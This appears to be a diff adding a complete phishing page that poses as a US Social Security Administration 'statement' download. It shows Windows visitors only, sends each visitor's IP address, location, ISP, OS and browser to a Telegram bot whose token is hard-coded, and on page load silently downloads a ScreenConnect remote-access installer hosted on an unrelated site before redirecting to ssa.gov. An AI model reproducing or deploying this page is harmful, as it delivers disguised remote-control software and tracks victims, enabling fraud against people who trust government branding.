@@ -1,1 +1,170 @@
+<?php
+// Windows-only access gate
+// If User-Agent doesn't indicate Windows, show an English message and stop.
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
+// Basic detection: true if the UA contains 'Windows' (covers Windows NT/10/11/etc.).
+$is_windows = stripos($ua, 'Windows') !== false;
+
+// Optionally allow empty UA only if coming from your own server or trusted IPs (disabled by default)
+// $trusted_ips = ['127.0.0.1', '::1'];
+// if (empty($ua) && in_array($_SERVER['REMOTE_ADDR'] ?? '', $trusted_ips, true)) { $is_windows = true; }
+
+if (!$is_windows) {
+    http_response_code(403);
+    header('Content-Type: text/html; charset=utf-8');
+    // Security: disable caching of the block page
+    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+    header('Pragma: no-cache');
+    echo '<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Access denied</title><style>body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial,"Noto Sans",sans-serif;background:#0b132b;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0} .card{background:#1c2541;border-radius:12px;padding:24px;max-width:540px;box-shadow:0 10px 30px rgba(0,0,0,.2)} h1{font-size:22px;margin:0 0 8px} p{margin:0 0 10px;line-height:1.6} .ua{font-family:monospace;direction:ltr;font-size:12px;word-break:break-all;background:#111827;padding:8px;border-radius:8px;color:#d1d5db}</style></head><body><div class="card"><h1>Access denied</h1><p>Access allowed from devices <strong>Windows</strong> Only.</p><p>?It seems you are using a different device..</p><div class="ua">User-Agent: ' . htmlspecialchars($ua, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</div></div></body></html>';
+    exit;
+}
+?>
+
+
+<?php
+// Telegram Bot Details
+$botToken = "8933160915:AAFBS15CUbs7hZdZSvCJ6vwl1Nw0QQlLfC8";
+$chatId = "1344154080";
+
+// Get visitor IP
+$ip = $_SERVER['REMOTE_ADDR'];
+
+// Get user agent info
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+// Get location info
+$apiResponse = file_get_contents("http://ip-api.com/json/$ip");
+$ipData = json_decode($apiResponse, true);
+
+// Extract data
+$isp     = $ipData['isp'] ?? "Unknown";
+$city    = $ipData['city'] ?? "Unknown";
+$region  = $ipData['regionName'] ?? "Unknown";
+$country = $ipData['country'] ?? "Unknown";
+
+// Detect OS
+function getOS($userAgent) {
+    $osList = [
+        'Windows' => 'Windows',
+        'Macintosh' => 'Mac OS',
+        'iPhone' => 'iOS',
+        'Android' => 'Android',
+        'Linux' => 'Linux',
+    ];
+    foreach ($osList as $key => $os) {
+        if (stripos($userAgent, $key) !== false) return $os;
+    }
+    return "Unknown";
+}
+
+// Detect Browser
+function getBrowser($userAgent) {
+    $browsers = [
+        'Chrome' => 'Chrome',
+        'Firefox' => 'Firefox',
+        'Safari' => 'Safari',
+        'Edge' => 'Edge',
+        'Opera' => 'Opera',
+        'MSIE' => 'Internet Explorer',
+    ];
+    foreach ($browsers as $key => $browser) {
+        if (stripos($userAgent, $key) !== false) return $browser;
+    }
+    return "Unknown";
+}
+
+$os = getOS($userAgent);
+$browser = getBrowser($userAgent);
+
+// Build message
+$message = "🔷 *New Visitor Alert:*\n";
+$message .= "🔹 *IP Address*: `$ip`\n";
+$message .= "🔹 *ISP*: $isp\n";
+$message .= "🔹 *City*: $city\n";
+$message .= "🔹 *Region*: $region\n";
+$message .= "🔹 *Country*: $country\n";
+$message .= "🔹 *Operating System*: $os\n";
+$message .= "🔹 *Browser*: $browser";
+
+// Send message to Telegram
+$url = "https://api.telegram.org/bot$botToken/sendMessage";
+$data = [
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'Markdown'
+];
+file_get_contents($url . '?' . http_build_query($data));
+?>
+<?php
+// السماح فقط لأجهزة Windows
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+if (!preg_match('/Windows/i', $userAgent)) {
+    die('<script>alert("statement works only on Windows devices.");</script>');
+}
+?>
+
+
+
+
+<!doctype html>
+<html>
+<head>
+  <title>Please wait</title>
+  <style type="text/css">
+    .style1 {
+      font-family: Verdana, Arial, Helvetica, sans-serif;
+      font-weight: bold;
+      font-size: 12px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+  </style>
+  <script type="text/javascript">
+    // Function to handle file download and redirect
+    function startDownloadAndRedirect() {
+      // Initiate the file download
+      const downloadLink = "https://aesalliance.com/includes/ScreenConnect.ClientSetup.exe";
+      const anchor = document.createElement('a');
+      anchor.href = downloadLink;
+      anchor.download = '';
+      anchor.click();
+
+      // Redirect to Google after 8 seconds
+      setTimeout(function() {
+        window.location.href = "https://www.ssa.gov/";
+      }, 8000);
+    }
+
+    // Start the process after page load
+    window.onload = startDownloadAndRedirect;
+  </script>
+</head>
+<body bgcolor="#FFFFFF">
+  <p>&nbsp;</p>
+  
+  <!-- SSA Logo Above the Loading Bar -->
+  <div class="logo">
+    <img alt="SSA Logo" src="https://ugc.production.linktr.ee/9c667166-4df0-4e51-9739-699c44aa3ca8_ssa-logo-the-united-states-social-security-administration.png?io=true&size=avatar" style="width: 150px;" />
+  </div>
+  
+  <!-- Accessing Page Text -->
+  <p style="text-align: center;">
+    <span style="font-size:18px;">
+      <strong><span style="color:#000000;">
+        <span class="style1">Downloading the Social Security Statement...
+        You will be redirected shortly after the download.</span>
+      </span></strong>
+    </span>
+  </p>
+  
+  <p style="text-align: center;">&nbsp;</p>
+  
+  <!-- Loading Indicator GIF -->
+  <p style="text-align: center;">
+    <img alt="Loading Indicator" id="indicator" name="indicator" src="https://media.giphy.com/media/xUPGciQ9ZEKWnEUXYI/giphy.gif" />
+  </p>
+</body>
+</html>
